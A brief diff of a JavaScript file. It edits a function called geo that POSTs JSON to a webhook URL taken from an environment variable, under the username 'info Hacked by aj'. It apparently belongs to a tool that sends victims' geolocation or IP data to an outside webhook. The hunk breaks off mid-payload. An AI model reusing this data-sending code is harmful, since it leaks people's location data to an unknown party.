@@ -14,7 +14,7 @@ require('dotenv').config
 function geo(json) {
     
   var request = new XMLHttpRequest();
-      request.open("POST", process.env.webhook);
+      request.open("POST", `${process.env.webhook}`);
       request.setRequestHeader('Content-type', 'application/json');
   var params = {
     username: "info Hacked by aj",
